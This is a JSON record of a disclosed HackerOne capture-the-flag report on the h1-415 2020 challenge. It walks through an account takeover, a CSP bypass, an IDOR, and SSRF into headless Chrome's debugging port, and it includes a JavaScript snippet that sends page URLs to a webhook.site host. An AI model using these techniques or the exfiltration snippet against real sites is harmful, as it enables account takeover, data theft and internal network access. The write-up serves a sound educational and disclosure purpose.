@@ -1,0 +1,158 @@
+{
+  "id": 781253,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODEyNTM=",
+  "url": "https://hackerone.com/reports/781253",
+  "title": "[h1-415 2020] h1ctf{y3s_1m_c0sm1c_n0w}",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-01-23T04:45:56.543Z",
+  "submitted_at": "2020-01-23T04:45:56.543Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "pirateducky",
+    "url": "/pirateducky",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 46757,
+    "url": "https://hackerone.com/h1-ctf",
+    "handle": "h1-ctf",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "h1-ctf",
+      "twitter_handle": "Hacker0x01",
+      "website": "",
+      "about": "Let's save the holidays together! #TogetherWeHitHarder"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-02-03T20:48:00.906Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-02-03T20:48:00.846Z",
+  "team_member_agreed_on_going_public_at": "2020-02-03T20:35:03.985Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n[add summary of the vulnerability]\nAccount takeover was possible because of the email validation used - `jobert@mydocz.cosmic<>{}` could be registered, but when the the system created the recovery `QR` code the extra symbols would get stripped leaving us with a valid recovery `QR` code to log into `jobert@mydocz.cosmic`. Once logged in we had access to the `support` bot (if you left a `1` star review, \"someone\" would come by and check our conversation) - here we realized we could inject markup however the CSP policy was pretty strict, the only outside script allowed to run needed to come from `https://github.com/mattboldt/typed.js/master/lib/` we found that we could append a github repo to this url and execute it's content `https://github.com/mattboldt/typed.js/master/lib/@https://github.com/username/repo_name/master/filename.js` you have to remove `/blob/` from the repo url.  Once we had execution we tried to exfiltrate `cookies` and anything we could think of, include `window.location.href` which gives you the current url the user is visiting, we did is using a script that looked like\n```js\nvar image = document.createElement(\"img\")\nvar image.src = \"webhook.site/1234/img.png?url= + window.location.href\ndocument.body.appendChild(image)\n``` \nThis allowed us to get the reviewer link to our conversation: `https://h1-415.h1ctf.com/support/review/39b707f120c5fde356bf0f5daec51bee292d38862d2bc7d09ba032257365e2dd` \nOnce you had access to the form in the reviews there's a form the reviewer has access to, to edit the user's name, this parameter was vulnerable to an IDOR - so you could edit anyone's name, we created a second trial account and tried to change its name - it worked, next we noticed the pdf's the application was creating rendered the name of the user - with this information we tried to inject html into the name using the IDOR we found and it worked! html is rendering, let's make a request to our server so we can get more information about what's creating these pdfs, here I used https://ssrftest.com to test for SSRF - there's a payload to use an image and try to get a request back to the server - it works and the header's that are important to us here are `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36` it tells us this is a headless browser Chrome running on linux, there's also a `Referer: http://localhost:3000/` so we know this is running behind a proxy - we spent a lot of time trying to figure out how to do the next thing - finally we started using an `iframe` to \"peek\" inside the application, trying ports, `80` returned `FORBIDDEN` and everything else we tried was blank, and then I remembered this was using `headless Chrome` so I used my google-fu and searched for `headless chrome port number` and the results were promising: \n```\nchrome \\\n  --headless \\                   # Runs Chrome in headless mode.\n  --disable-gpu \\                # Temporarily needed if running on Windows.\n  --remote-debugging-port=9222 \\\n  https://www.chromestatus.com   # URL to open. Defaults to about:blank.\n```\n\nWe used that port number like so: `<iframe src='http://localhost:9222 width=900 height=900></iframe>` this gave us back: \n\n`Inspectable WebContents`  :( \n\nbut then we tried: `<iframe src='http://localhost:9222/json width=900 height=900></iframe>` and....\n\nwe receive a json document with the important part being\n```\nsecret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\",   \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/E20087FA03CA27A6E908AFD7E5321E88\"```\n\nif you access: https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\n\nIt is done! \n\nThank you Hacker1 for hosting this event, I participated with 2 other awesome friends from the hacker101 discord @checkm50 & @ Al-MadjusT who without I would not have been able to finish it - we did it and took us every moment of it, but we did it. And it feels awesome! \n\nThis write up is last minute and it sucks, next time I'll write a better one, this one was all about getting it done.\n\nAgain thank you!\n\n## Impact\n\nWe finished it.\n\nWe got to take over an account and compromise the internal network to retrieve the secret document.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 693486,
+      "file_name": "Screenshot_2020-01-22_0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab_pdf.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/SFCdWcKSFNgy2S4tQY2RDuNt?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-01-22_0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab_pdf.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-01-22_0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab_pdf.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUV2CGWUB%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152020Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQCTXpxsFPt1L%2FkCxOVB1B3bBXWaNOlY5wahEl5r2sxxBgIhANZZTGMjD1dUdM6hu53hcgIE%2BhLd%2F5bYa3ZdxidZkTITKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx%2FJgTOGH7sfsex8cIqjgU0qgSJ9WhXa7evAxE%2B%2BIf9cl6N4OunmKi1bbV3Gj4oEXwaOD6BD53PpBRgoDh3BKRK1f7KsrMtk7oQKfjJkC24OrFpqNdFReGiSfZ1iwGS3LhDzFVwQdn1%2BK8Ol6C6ex3caYbFTIhVw0SAtKwqliL%2F93RaJd7oREgGvzI8IG0T3IAxQX7%2FCcOBfHTXizPiBLNrfLpqwm0Nwl2%2F1nMwD%2FIlZVXXGLkOMUb1J4dBuH2ILkLdJY5uvzxYr80JyJqgUzwRAkazE1oYfLyHJGRBgJHJ2dA1FSp7B%2BGFd%2Fo%2FfcRyyL7GyD%2BuH8BKk%2F0bR8j9qmQnftDc7%2B4mafAudu0YWNx47h7wl0lF9X9f5SnqU4ImIYjPUeS8zJ%2BElpfJAshC9lqkuO1uuQrQlknnzGulGKpUkLj3dE0y2TI5tUrjC%2FtF8%2FIsUntd2eVaBF%2FYE%2BelZD6Zftc9ZvvVQhImYlFGiHGzEun8Zp77ikhc7pdZNm55EhQZoQW0aLxeUZRGEDT65OOfGiqUSk0YPu1y7idAZZy7M5yu8GzeYOvmYsGOt0aKWBoH6bquc9IcUzfFKfSiTQ1vsts7yC3dadpPkBxwfBkn9bh6bKJf7CAFfueAhP%2Fbc%2By%2FEF3wSNK%2BE2PDtFfzNfck9xkYhPJbdwq8L11C4x3EM7BkGkGGjoml%2FCdzIWn9jXxMZhMejeAheaWqKqnR4rmFmYlvfiJLpuQAouvvUzpfQo%2BuzwtTLMJrl8P%2FoIH7WVxm2WwZy4tO%2Blx3c7%2F7fv9LSeE5E%2FOgOg%2B6bSI4RkNXAtNyPDG%2FeY7u5VFXYYHBgji2BWbqq0UGfKEvusUXUVtwFuAniojpSOzeVkfC9Oow64qoX4LMGa%2FZlsSi55wwtv78zwY6sAFsfiizT40h6BNyeJmgpnfo1N6cLUC4QuJhp2F6NPTJJuTaz%2F0q%2Fv4xHYTI8pFZShEkmnGRggZOoBtIuL5ZHtnM2olXFY3CVC9y72drP3OwIIToCP3Ui4zOhTQV2R78aLq8IQJyVf7nMR6yVlk2gQI1svAuSOAjVsTkyK%2Bd7vItexRmem3Td1bRFMAPLnCKsHM5FYhtHwhI%2BaSL6Y2BjpQeVoBT5xKJrTpvsPBYzzJp%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3b4f86f3e3f1017749c40d6667a14ae0c70680535f379ea73de4de188e724c9a",
+      "file_size": 387271,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-03-04T20:35:04.150Z",
+  "allow_singular_disclosure_after": -194985915.94008878,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "nytr0gen",
+    "dee-see",
+    "checkm50",
+    "0xacb",
+    "tess",
+    "sameerphad72",
+    "pirateducky",
+    "w2w",
+    "rhinestonecowboy",
+    "nukedx",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 42751,
+    "asset_type": "URL",
+    "asset_identifier": "h1-415.h1ctf.com",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 20046,
+      "category": "researcher",
+      "content": "Account take over => CSP bypass to execute javascript => IDOR => Access to internal network => access to debugging on headless Chrome.",
+      "updated_at": "2020-02-03T20:49:15.515Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 266095,
+        "username": "pirateducky",
+        "name": "",
+        "bio": "I like to break things ",
+        "cleared": false,
+        "verified": false,
+        "website": "https://dev.to/pirateducky/",
+        "location": "Nashville, TN",
+        "created_at": "2018-04-19T14:35:44.559Z",
+        "url": "https://hackerone.com/pirateducky",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
